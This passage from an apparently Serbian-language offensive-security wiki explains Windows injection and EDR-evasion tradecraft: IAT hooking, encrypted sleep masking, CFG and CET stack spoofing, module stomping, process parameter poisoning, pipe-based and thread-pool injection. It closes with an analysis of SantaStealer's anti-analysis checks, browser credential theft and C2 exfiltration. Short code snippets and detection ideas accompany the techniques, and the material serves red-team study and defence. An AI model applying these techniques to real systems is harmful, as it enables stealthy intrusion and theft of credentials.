Povezani building blocks i primeri
- Reflective loaders koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hookuješ importe **tokom** `ProcessImports()` tako što ćeš pokazivač loadera na `GetProcAddress` zameniti prilagođenim resolver-om koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **resident PICO** (persistent PIC object) koji opstaje nakon što se privremeni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja menja resolver importa loadera (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U funkciji `_GetProcAddress` preskoči ordinal imports i koristi hook lookup zasnovan na hash-u, kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi poziv pravom `GetProcAddress`.
- Registruj ciljeve hookova u vreme linkovanja pomoću Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook ostaje validan jer se nalazi unutar rezidentnog PICO-a.

Tako se postiže **import-time IAT redirection** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Forsiranje hookable importa kada cilj koristi PEB-walking

Import-time hooks se aktiviraju samo ako je funkcija stvarno u IAT-u ciljnog procesa. Ako modul razrešava API-je pomoću PEB-walk + hash (bez import entry-ja), forsiraj pravi import kako bi loader-ov `ProcessImports()` putanja mogao da ga obradi:

- Zameni razrešavanje hashed export-a (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom, kao što je `&WaitForSingleObject`.
- Kompajler emituje IAT entry, čime se omogućava presretanje pri razrešavanju importa kroz reflective loader.

### Ekko-style sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hookuj **stvarne wait/IPC primitives** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kod dugih čekanja, obavij poziv Ekko-style obfuscation chain-om koji šifruje image u memoriji tokom mirovanja:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` da zakaže niz callbacks koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frames.
- Uobičajen chain (x64): postavi image na `PAGE_READWRITE` → šifruj ga RC4 algoritmom preko `advapi32!SystemFunction032` koristeći ceo mapirani image → obavi blokirajuće čekanje → dešifruj RC4 algoritmom → **vrati dozvole za svaki section** prolaskom kroz PE sections → signalizuj završetak.
- `RtlCaptureContext` obezbeđuje šablon `CONTEXT`; kloniraj ga u više frames i podesi registers (`Rip/Rcx/Rdx/R8/R9`) da bi se pozvao svaki korak.

Operativni detalj: za duga čekanja vrati „success“ (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od skenera tokom perioda mirovanja i izbegava prepoznatljiv obrazac patchovanog `Sleep()`.

Ideje za detekciju (zasnovane na telemetriji)
- Naleti `CreateTimerQueueTimer` callbacks koji upućuju na `NtContinue`.
- `advapi32!SystemFunction032` koji se koristi nad velikim, neprekinutim buffers veličine image-a.
- `VirtualProtect` nad velikim opsegom, a zatim prilagođeno vraćanje dozvola za pojedinačne sections.

### Runtime CFG registration za sleep-obfuscation gadgets

Na CFG-om zaštićenim ciljnim procesima, prvi indirect jump u mid-function gadget kao što je `jmp [rbx]` ili `jmp rdi` obično će srušiti proces uz `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije naveden u CFG metadata modula. Da bi Ekko/Kraken-style chains mogli da rade unutar ojačanih procesa:<sup>[[30]](#references)</sup>

- Registruj svako indirect odredište koje chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i `CFG_CALL_TARGET_VALID` entries.
- Za adrese unutar učitanih images (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje na **image base** adresi i da obuhvati **punu veličinu image-a**.
- Za ručno mapirane/PIC/stomped regions koristi **allocation base** i veličinu alokacije.
- Označi ne samo dispatch gadget već i indirektno pozvane exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) i sve attacker-controlled executable sections koje će postati indirect targets.

Time se ROP/JOP-style sleep chains, koje su ranije „radile samo u procesima bez CFG-a“, pretvaraju u primitiv koji se može ponovo koristiti u `explorer.exe`, browsers, `svchost.exe` i drugim endpoint-ima kompajliranim sa `/guard:cf`.

### CET-safe stack spoofing za uspavane threads

Potpuna zamena `CONTEXT`-a stvara mnogo šuma i može da zakaže na CET Shadow Stack sistemima jer spoofed `Rip` i dalje mora da odgovara hardverskom shadow stack-u. Bezbedniji obrazac za sleep-masking je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i pročitaj granice njegovog `NT_TIB` / TEB stack-a (`StackBase`, `StackLimit`) pomoću `NtQueryInformationThread`.
- Napravi rezervnu kopiju stvarnog TEB/TIB-a trenutnog thread-a.
- Sačuvaj stvarni kontekst thread-a tokom spavanja pomoću `GetThreadContext`.
- U spoof kontekst kopiraj **samo** stvarni `Rip`, ostavljajući spoofed `Rsp`/stack state netaknutim.
- Tokom perioda spavanja kopiraj `NT_TIB` spoof thread-a u TEB trenutnog thread-a, kako bi stack walkers razmotavali stack unutar legitimnog opsega.
- Kada se čekanje završi, vrati originalni TIB i kontekst thread-a.

Ovim se zadržava CET-usaglašen instruction pointer, a istovremeno se obmanjuju EDR stack walkers koji se oslanjaju na TEB stack metadata za proveru stack unwind-a.

### Alternativa zasnovana na APC-u: Kraken Mask

Ako je timer-queue dispatch previše prepoznatljiv, isti sleep-encrypt-spoof-restore redosled može da se izvrši iz suspendovanog helper thread-a pomoću queued APCs:<sup>[[27]](#references)</sup>

- Napravi helper thread sa `NtTestAlert` kao entrypoint.
- Postavi pripremljene `CONTEXT` frames/APCs pomoću `NtQueueApcThread` i obradi ih pomoću `NtAlertResumeThread`.
- Stanje chain-a čuvaj na heap-u umesto na stack-u helper thread-a, da bi se izbeglo iscrpljivanje podrazumevanog stack-a thread-a od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` da bi se atomarno signalizovao start event i proces blokirao.
- Suspenduj glavni thread pre vraćanja TIB-a/konteksta (`NtSuspendThread` → restore → `NtResumeThread`) da bi se smanjio vremenski prozor u kom bi skener mogao da uhvati delimično vraćen stack.

Ovim se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom helper-thread/APC, uz zadržavanje istih ciljeva RC4 masking-a i stack-spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre spavanja, čekanja ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` omotani oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread`, praćen direktnim upisivanjima u granice stack-a trenutnog thread-a u TEB/TIB-u.
- `NtQueueApcThread`/`NtAlertResumeThread` chains koji indirektno dolaze do `SystemFunction032`, `VirtualProtect` ili helpers za vraćanje dozvola za sections.
- Ponovljena upotreba kratkih gadget signatures kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivots unutar potpisanih modula.


## Precision Module Stomping

Module stomping izvršava payload iz **`.text` section-a DLL-a koji je već mapiran unutar ciljnog procesa**, umesto alokacije očigledne privatne executable memory ili učitavanja novog sacrificial DLL-a. Cilj za prepisivanje treba da bude **učitan image sa diska** čiji code space može da primi payload bez oštećivanja putanja izvršavanja koje su i dalje potrebne procesu.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivni stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` nije pouzdan: DLL možda nije učitan u udaljeni proces, a premali code region može da sruši proces. Pouzdaniji postupak je:

1. Izlistaj module ciljnog procesa i zadrži **names-only include list** već učitanih DLL-ova.
2. Prvo napravi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Pregledaj DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu executable section-a **kada se mapira u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA eksportovane funkcije kao početni offset za stomping.
5. Izračunaj **blast radius**: ako je payload veći od granice izabrane funkcije, pregaziće susedne exports koji se nalaze iza nje u memoriji.

Tipični alati za recon/izbor ciljeva koji se koriste:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
- Prednost dajte DLL-ovima koji su **već učitani** u udaljenom procesu kako biste izbegli telemetriju od `LoadLibrary`/neočekivanog učitavanja image-a.
- Prednost dajte export-ima koje ciljna aplikacija retko izvršava; u suprotnom, uobičajeni putevi izvršavanja mogu doći do izmenjenih bajtova pre ili posle kreiranja threada.
- Za velike implant-e često je potrebno promeniti ugrađivanje shellcode-a sa string literala na **inicijalizator niza bajtova/u vitičastim zagradama** kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injector-a.

Ideje za detekciju
- Udaljeni upisi u **izvršne stranice potkrepljene image-om** (`MEM_IMAGE`, `PAGE_EXECUTE*`), umesto u češće privatne RWX/RX alokacije.
- Ulazne tačke export-a čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljeni thread-ovi ili preusmeravanja konteksta koji započinju izvršavanje unutar export-a legitimnog DLL-a čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje threada.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **ubacivanja u proces / izbegavanja EDR-a** koja zaobilazi klasičan put udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenut ciljni proces, zloupotrebljava činjenicu da Windows **kopira izabrane početne parametre iz `CreateProcessW` u child proces** i čuva ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Prenosioci podložni trovanju koje kopira `CreateProcessW`

Korisni prenosioci su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograničenja praktične upotrebe prenosilaca:

- `lpCommandLine` mora pokazivati na **upisivu memoriju** za `CreateProcessW`, a ograničen je na **32,767 Unicode znakova**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode blok okruženja koji sadrži uzastopne stringove `NAME=VALUE\0`, završene dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, zato mapiranje `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim, dokumentovanim ugovorom.

Time se normalno kreiranje procesa pretvara u **primitiv za prenos korisnog sadržaja**. Operator kreira child proces sa početnim podacima koje kontroliše napadač i prepušta Windows-u da obavi međuprocesno kopiranje.

### Tok pronalaženja udaljene memorije bez API-ja za udaljeni upis

Nakon kreiranja child procesa, pronađite kopirani bafer pomoću **primitiva samo za čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobavite `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite izabrani pokazivač:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirani region parametara obično ima dozvole `RW`, a ne dozvolu za izvršavanje. Uobičajeni P3 lanac je:

1. Kreirati proces na uobičajen način (ne suspendovan)
2. Učiniti izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisati `RIP`)

Za razliku od klasičnih postupaka otmice niti, za ovo **nije potrebno** pozvati `SuspendThread` / `ResumeThread`; kontekst može direktno da se promeni preko vraćenog handle-a glavne niti.

Time se izbegava nekoliko API-ja koji se često nadgledaju zbog ubrizgavanja:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje null bajta i staged shellcode

Sva tri nosača su **nizovi ili podaci nalik nizovima**, pa se neobrađeni payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **prva faza bez null bajtova** koja ponovo sastavlja konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu fazu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava prvoj fazi da formira stringove na steku, argumente API-ja, putanje do DLL-ova ili loader shellcode-a druge faze, bez ugrađivanja null bajtova u preneti parametar.

### Pozivi API-ja zasnovani na steku iz prve faze

Kada prva faza mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek procesa na ciljnom sistemu
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održava **16-byte poravnanje** `RSP` pre poziva

Druga faza zatim može da se kopira sa steka u alokaciju `PAGE_READWRITE`, promeni zaštitu u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i pokrene skokom do nje, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Dobre mogućnosti za lov na pretnje koje su autori pomenuli:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji stranice parametara procesa čine izvršnim
- promena zaštite praćena sa `SetThreadContext` / `NtSetContextThread`
- udaljeno čitanje `PEB`, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugačke vrednosti ili vrednosti visoke entropije za `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` tokom kreiranja procesa

### Napomene

- P3 je trik za **prenos između procesa**, a ne samostalna primitiva za izvršavanje: kopiranom parametru je i dalje potrebna promena dozvole na izvršavanje i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno poziva sumnjive primitive kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

Za isporuku payload-a u **postojeći** Windows proces putem opisa niti, uz hijacking povratne adrese нити koja čeka, pogledajte [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Injektovanje preko STDIN pipe-a konzole

Interaktivni child proces konzole može da se koristi i kao **primitiva za prenos payload-a**. Injector preusmerava standardni ulaz child procesa na pipe i šalje marker, a zatim shellcode. Kada konzolni program učita podatke u sopstvenu privatnu memoriju, injector pronalazi taj bafer, čini ga izvršnim i preusmerava nit child procesa na njega. Time se izbegavaju `VirtualAllocEx` i `WriteProcessMemory`, ali i dalje je reč o process injection-u, a ne o opštem EDR bypass-u.<sup>[[41]](#references)</sup>

Uprkos opisu „named-pipe“, referentna implementacija poziva `CreatePipe`, koji kreira **anonymous pipe**. Windows interno implementira anonymous pipe-ove pomoću objekata pipe-a sa jedinstvenim imenima, ali PoC ne bira putanju `\\.\pipe\<name>` niti poziva `CreateNamedPipe`. Kreira handle-ove koji se mogu nasleđivati, uz podrazumevani security descriptor, postavlja read handle u `STARTUPINFO.hStdInput`, postavlja `STARTF_USESTDHANDLES` i pokreće novi child proces uz omogućeno nasleđivanje handle-ova. Zato ovaj PoC pokreće prosleđenu konzolnu izvršnu datoteku; ne povezuje pipe sa postojećim procesom.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referentni tok rada

Implementacija koristi sledeći niz koraka:<sup>[[41]](#references)</sup>

1. Kreira parove anonymous pipe-ova za `STDIN` i `STDOUT` child procesa. Isključuje nasleđivanje za dva handle-a na strani parent procesa i zatvara kopije handle-ova na strani child procesa u parent procesu nakon kreiranja procesa.
2. Pokreće interaktivnu izvršnu datoteku kao što je `netsh.exe` ili `nslookup.exe` pomoću `CREATE_NEW_CONSOLE`. Child proces nasleđuje preusmerene standardne handle-ove.
3. Šalje ceo binarni niz `rawData` pomoću `WriteFile` kroz handle `STDIN` na strani parent procesa. Konzolni program obrađuje bajtove i ostavlja kopiju u jednom od svojih privatnih commit-ovanih regiona.
4. Prolazi kroz adresni prostor child procesa pomoću `VirtualQueryEx`, čita moguće regione `MEM_PRIVATE` pomoću `ReadProcessMemory` i traži marker na početku niza `rawData`.
5. Menja zaštitu otkrivenog bafera u `PAGE_EXECUTE_READWRITE` pomoću `VirtualProtectEx`.
6. Identifikuje glavnu nit, suspenduje je, postavlja `RIP` na `found_address + 0x19` pomoću `NtSetContextThread` i nastavlja njeno izvršavanje.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Isporučena implementacija je specifična za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, pa izvršni bajtovi počinju na heksadecimalnom pomeraju `0x19`. Pri zameni payload-a, sačuvajte taj raspored ili istovremeno ažurirajte marker, vektor pretrage, veličinu niza i pomeraj izvršavanja. Komentari u izvornom kodu navode i `0x0A`, `0x0D` i `0x1A` kao nepoželjne znakove. Ovaj workflow ne menja token niti privilegije deteta.<sup>[[41]](#references)</sup>

Za male native pomoćne programe i obrasce za kompajliranje payload-a, pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection putem callback-a thread-pool-a bez shellcode-a (DLLParty)

DLLParty prilagođava thread-pool injection u stilu PoolParty tako da postojeći worker ciljnog procesa pozove `LoadLibraryA`, umesto da izvršava ubačeni callback stub. Njegov primitiv za dispečiranje je `TP_DIRECT` completion koji se stavlja u red čekanja na I/O completion port ciljnog pool-a. Time se ne zaobilaze dozvole procesa: PoC poziva `OpenProcess(PROCESS_ALL_ACCESS)` i zahteva čitanje i upisivanje u memoriju ciljnog procesa, kao i mogućnost dupliranja handle-ova worker factory-ja i completion port-a.<sup>[[46]](#references)[[47]](#references)</sup>

Na Windows x64, worker prosleđuje pokazivač na `TP_CALLBACK_INSTANCE` smešten na steku kroz `RCX`, prvi argument callback-a. `LoadLibraryA` taj isti pokazivač tumači kao `LPCSTR`. Na testiranoj putanji, `TppWorkerThread` pravi pokazivač na `RSP+0x178`, dok se prvi uobičajeni upis u taj objekat obavlja na `RSP+0x1d0`. Zato putanja DLL-a završena null znakom, koja staje u ovaj prefiks od 0x58 bajtova, može da zauzme početak instance, a da ne bude prepisana pre dispečiranja. Ovo zapažanje važi za određenu verziju i nije dokumentovana garancija Windows ABI-ja.<sup>[[46]](#references)[[47]](#references)</sup>

Referentni workflow je:<sup>[[46]](#references)[[47]](#references)</sup>

1. Nabrojte handle-ove ciljnog procesa pomoću `NtQuerySystemInformation(SystemHandleInformation)` i identifikujte `TpWorkerFactory` upitom za tipove objekata. Duplirajte handle worker factory-ja i upitom dobijte `WorkerFactoryBasicInformation`; `StartParameter` daje udaljeni `TP_POOL`. Preskočite factory-je kod kojih je `TotalWorkerCount == 0`.
2. Pročitajte `TP_POOL.CompletionPort` i prođite kroz privatnu listu worker-a pool-a. Na testiranoj x64 verziji Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), glava liste je na `pool+0x60`; svaka veza je na `worker+0x10`, pa slot callback instance na `worker+0x38` odgovara vrednosti `link+0x28`. PoC proverava poravnanje pokazivača, uzajamnu povezanost veza, vlasništvo nad pool-om, nenulte ID-jeve niti, ponovljene čvorove i stabilnu glavu liste.
3. Upišite putanju DLL-a u **svaki** pronađeni worker slot jer completion iz reda čekanja može da preuzme bilo koji worker. Smestite `TP_DIRECT` sa `Callback = LoadLibraryA` u upisivu memoriju ciljnog procesa. PoC koristi `last_slot-0x500` na steku worker-a umesto `VirtualAllocEx`; taj pomeraj je eksperimentalni i ne sme da se preklapa sa aktivnim podacima na steku.
4. Duplirajte handle completion port-a ciljnog procesa i pozovite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adresa udaljenog `TP_DIRECT` objekta je completion key. Postojeći worker zatim poziva `LoadLibraryA` koristeći prepisani pokazivač na callback instancu i učitava DLL koji je već dostupan ciljnom procesu.

PoC prima PID ciljnog procesa (`DLLParty.exe <target_pid>`) i koristi hardkodiranu putanju DLL-a u `DLLParty.cpp`; pre kompiliranja x64 izvršne datoteke podesite putanju kojoj ciljni proces može da pristupi. Takođe koristi adresu `LoadLibraryA` iz sopstvenog procesa kao udaljeni callback, pa pretpostavlja da ta adresa važi i u ciljnom procesu. Kod ne proverava da li dužina putanje staje u prefiks od 0x58 bajtova, niti da li je obilazak worker-a pronašao slot pre indeksiranja poslednjeg elementa. Ponovo proverite privatne pomeraje, raspored na steku i upisivi prostor za ciljnu verziju. Izostavljanje `CreateRemoteThreadEx`, shellcode-a i `VirtualAllocEx` ne uklanja upise između procesa niti telemetriju učitavanja DLL-a.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer tehnike za izbegavanje detekcije bez datoteka i krađu akreditiva

SantaStealer (aka BluelineStealer) pokazuje kako savremeni info-stealeri kombinuju AV bypass, anti-analysis i pristup akreditivima u jednom workflow-u.<sup>[[24]](#references)</sup>

### Provera rasporeda tastature i odlaganje u sandbox-u

- Konfiguraciona zastavica (`anti_cis`) nabraja instalirane rasporede tastature pomoću `GetKeyboardLayoutList`. Ako pronađe ćirilični raspored, uzorak pravi prazan marker `CIS` i prekida izvršavanje pre pokretanja stealera, čime sprečava aktivaciju u isključenim lokalnim okruženjima, a istovremeno ostavlja artefakt za lov na pretnje.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svako ime prilagođenom rolling checksum funkcijom i poredi ga sa ugrađenim blocklistama za debugere/sandboxe; ponavlja checksum nad imenom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (minimalan broj procesa, nedavno vreme od pokretanja), poziva `OpenServiceA("VBoxGuest")` da bi otkrila VirtualBox additions i obavlja vremenske provere oko pauza kako bi prepoznala single-stepping. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Pomoćni modul bez datoteka + dvostruko ChaCha20 reflektivno učitavanje

- Primarna DLL/EXE datoteka sadrži Chromium credential helper koji se ili zapisuje na disk ili se ručno mapira u memoriju; fileless režim samostalno razrešava imports/relocations, tako da se ne zapisuju nikakvi helper artefakti.
- Taj helper čuva DLL druge faze, dvaput šifrovanu ChaCha20 algoritmom (dva ključa od 32 bajta + 12-bajtni nonce). Nakon oba prolaza, blob se učitava reflektivno (bez `LoadLibrary`) i pozivaju se exporti `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedeni iz projekta [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste reflective process hollowing sa direct syscall pozivima da bi se ubacile u aktivan Chromium browser, nasledile AppBound Encryption ključeve i dešifrovale lozinke/cookies/kreditne kartice direktno iz SQLite baza podataka uprkos ABE zaštiti.

### Modularno prikupljanje u memoriji i HTTP eksfiltracija u delovima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće jednu nit za svaki omogućen modul (Telegram, Discord, Steam, snimci ekrana, dokumenti, ekstenzije browsera itd.). Svaka nit upisuje rezultate u zajedničke bafere i prijavljuje broj datoteka nakon perioda čekanja na niti od oko 45 sekundi.
- Po završetku, sve se arhivira pomoću statički linkovane biblioteke `miniz` u `%TEMP%\\Log.zip`. `ThreadPayload1` zatim čeka 15 sekundi i šalje arhivu u delovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, lažno predstavljajući granicu browsera `multipart/form-data` (`----WebKitFormBoundary***`). Svaki deo dodaje `User-Agent: upload`, `auth: <build_id>`, opcionalno `w: <campaign_tag>`, a poslednji deo dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Napredne taktike zaobilaženja: precizno gaženje modula](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Pozivni stekovi: nema više besplatnog prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za lažiranje pozivnog steka](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Treba li verovati svom zero trust-u? Zaobilaženje Zscaler provera bezbednosnog stanja](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: istraživanje ranijih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: zloupotreba prosleđenih exporta](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Popis prosleđenih exporta u Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dinamički linkovanih biblioteka](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Pokretač CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz zaštitu koju pruža Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Zaobilaženje zaštitne barijere Windows Defender-a tehnikom preusmeravanja fascikli](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenca komande mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Iza čiste zavese: od RAT-a do buildera do programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer dolazi u grad: novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – dešifrovanje Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: suzbijanje Node.js malware-a pomoću API tracing-a](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uspavana lepotica: uspavljivanje Adaptix-a pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Trovanje parametara procesa](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uspavana lepotica II: CFG, CET i lažiranje steka](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko obfuskacija spavanja](https://github.com/Cracked5pider/Ekko)
